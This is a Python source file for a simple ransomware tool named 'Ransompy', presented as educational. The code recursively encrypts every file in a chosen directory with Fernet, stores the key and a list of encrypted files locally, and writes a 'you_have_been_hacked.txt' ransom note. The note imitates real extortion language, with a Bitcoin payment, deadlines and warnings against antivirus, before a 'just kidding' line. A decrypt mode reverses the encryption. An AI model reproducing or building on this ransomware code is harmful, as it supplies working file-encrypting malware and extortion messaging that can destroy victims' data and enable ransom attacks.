import os
import uuid
from cryptography.fernet import Fernet

KEYS_DIR = "keys"
DATABASE_DIR = "database"


def generate_key(md5_hash):
    key = Fernet.generate_key()
    if not os.path.exists(KEYS_DIR):
        os.mkdir(KEYS_DIR)
    with open(f"{KEYS_DIR}/{md5_hash}.key", "wb") as key_file:
        key_file.write(key)


def load_key(md5_hash):
    return open(f"{KEYS_DIR}/{md5_hash}.key", "rb").read()


def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(file_path, "wb") as f:
        f.write(encrypted)


def decrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        encrypted_data = f.read()

    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)

    with open(file_path, "wb") as f:
        f.write(decrypted_data)


def update_database(md5_hash, file_path):
    if not os.path.exists(DATABASE_DIR):
        os.mkdir(DATABASE_DIR)

    database_file = os.path.join(DATABASE_DIR, f"{md5_hash}.txt")
    with open(database_file, "a") as db:
        db.write(f"{file_path}\n")


def create_info_file(directory, md5_hash):
    info_file_path = os.path.join(directory, "you_have_been_hacked.txt")
    info_text = f"""
                                        ..                    ..       
  .uef^"                          < .z@8"`                  dF         
:d88E                              !@88E                   '88bu.      
`888E             u           .    '888E   u         .u    '*88888bu   
 888E .z8k     us888u.   .udR88N    888E u@8NL    ud8888.    ^"*8888N  
 888E~?888L .@88 "8888" <888'888k   888E`"88*"  :888'8888.  beWE "888L 
 888E  888E 9888  9888  9888 'Y"    888E .dN.   d888 '88%"  888E  888E 
 888E  888E 9888  9888  9888        888E~8888   8888.+"     888E  888E 
 888E  888E 9888  9888  9888        888E '888&  8888L       888E  888F 
 888E  888E 9888  9888  ?8888u../   888E  9888. '8888c. .+ .888N..888  
m888N= 888> "888*""888"  "8888P'  '"888*" 4888"  "88888%    `"888*""   
 `Y"   888   ^Y"   ^Y'     "P'       ""    ""      "YP'        ""      
      J88"                                                             
      @%                                                               
    :"                                                                 

Congratulations! You have been hacked.


Please read the following instructions carefully and do not try to recover your files by yourself, it will only make things worse.
Don't try to use antivirus or decryption tools, they will not help you and can make your files unrecoverable.
Don't rename or move encrypted files, it will cause your data loss forever.
---

# What happened to my files?
Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.
Do not remove or rename encrypted files. It will cause your data loss forever.
---

# Can I recover my files?
Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time.
But if you want to decrypt all your files, you need to pay.
You only have 7 days to submit the payment. After that the price will be doubled.
Also, if you don't pay in 15 days, you won't be able to recover your files forever.
---

# How do I pay?
Payment is accepted in Bitcoin only. For more information, click the button "Buy Bitcoin" or "How to buy Bitcoin?".

Nah, just kidding. You can decrypt all your files for free. Just send us your unique ID:
{md5_hash}

We will decrypt all your files as soon as possible.
---


Be more careful next time!
"""

    with open(info_file_path, "w") as info_file:
        info_file.write(info_text)


def remove_from_database(md5_hash, file_path):
    database_file = os.path.join(DATABASE_DIR, f"{md5_hash}.txt")
    encrypted_items = set()

    if os.path.exists(database_file):
        with open(database_file, "r") as db:
            encrypted_items = set(db.read().splitlines())

    encrypted_items.discard(file_path)

    with open(database_file, "w") as db:
        db.write("\n".join(encrypted_items))


def main():
    print(
        """
                                          .x+=:.                                                              
                                         z`    ^%                                                  ..         
   .u    .                  u.    u.        .   <k        u.      ..    .     :     .d``          @L          
 .d88B :@8c        u      x@88k u@88c.    .@8Ned8"  ...ue888b   .888: x888  x888.   @8Ne.   .u   9888i   .dL  
="8888f8888r    us888u.  ^"8888""8888"  .@^%8888"   888R Y888r ~`8888~'888X`?888f`  %8888:u@88N  `Y888k:*888. 
  4888>'88"  .@88 "8888"   8888  888R  x88:  `)8b.  888R I888>   X888  888X '888>    `888I  888.   888E  888I 
  4888> '    9888  9888    8888  888R  8888N=*8888  888R I888>   X888  888X '888>     888I  888I   888E  888I 
  4888>      9888  9888    8888  888R   %8"    R88  888R I888>   X888  888X '888>     888I  888I   888E  888I 
 .d888L .+   9888  9888    8888  888R    @8Wou 9%  u8888cJ888    X888  888X '888>   uW888L  888'   888E  888I 
 ^"8888*"    9888  9888   "*88*" 8888" .888888P`    "*888*P"    "*88%""*88" '888!` '*88888Nu88P   x888N><888' 
    "Y"      "888*""888"    ""   'Y"   `   ^"F        'Y"         `~    "    `"`   ~ '88888F`      "88"  888  
              ^Y"   ^Y'                                                               888 ^              88F  
                                                                                      *8E               98"   
                                                                                      '8>             ./"     
                                                                                       "             ~`       

Welcome to Ransompy, a simple ransomware written in Python.

This tool is for educational purposes only. I am not responsible for any damage caused by this tool.
"""
    )
    choice = input("What do you want to do?\n1. Encrypt files\n2. Decrypt files\n")

    if choice == "1":
        directory = input("\nEnter the directory to encrypt:\n")

        if not os.path.exists(directory):
            print("Directory not found.")
            return

        md5_hash = uuid.uuid5(uuid.NAMESPACE_DNS, directory).hex
        generate_key(md5_hash)
        key = load_key(md5_hash)

        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Check if the file is already encrypted
                    if not file_path.endswith(".key"):
                        encrypt_file(file_path, key)
                        update_database(
                            md5_hash, file_path
                        )  # Add file to database list
                        print(f"{file} successfully encrypted!")
                except Exception as e:
                    print(f"{file} could not be encrypted: {e}")

        create_info_file(
            directory, md5_hash
        )  # Create info file with instructions to decrypt files

    elif choice == "2":
        directory = input("\nEnter the directory to decrypt:\n")

        if not os.path.exists(directory):
            print("Directory not found.")
            return

        md5_hash = uuid.uuid5(uuid.NAMESPACE_DNS, directory).hex
        key = load_key(md5_hash)

        database_file = os.path.join(DATABASE_DIR, f"{md5_hash}.txt")
        encrypted_items = set()

        if os.path.exists(database_file):
            with open(database_file, "r") as db:
                encrypted_items = set(db.read().splitlines())

        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Check if the file is already decrypted
                    if not file_path.endswith(".key"):
                        if file_path in encrypted_items:
                            decrypt_file(file_path, key)
                            print(f"{file} successfully decrypted!")
                            remove_from_database(
                                md5_hash, file_path
                            )  # Remove file from database list
                            encrypted_items.remove(
                                file_path
                            )  # Remove file from encrypted items list
                except Exception as e:
                    print(f"{file} could not be decrypted: {e}")

        # If there are no more encrypted items, remove the key and database files
        if len(encrypted_items) == 0:
            try:
                os.remove(f"{os.getcwd()}/{KEYS_DIR}/{md5_hash}.key")
                os.remove(f"{os.getcwd()}/{DATABASE_DIR}/{md5_hash}.txt")
                os.remove(f"{directory}/you_have_been_hacked.txt")
            except Exception as e:
                print(f"Could not remove files: {e}")

    else:
        print("Invalid choice.")


if __name__ == "__main__":
    main()
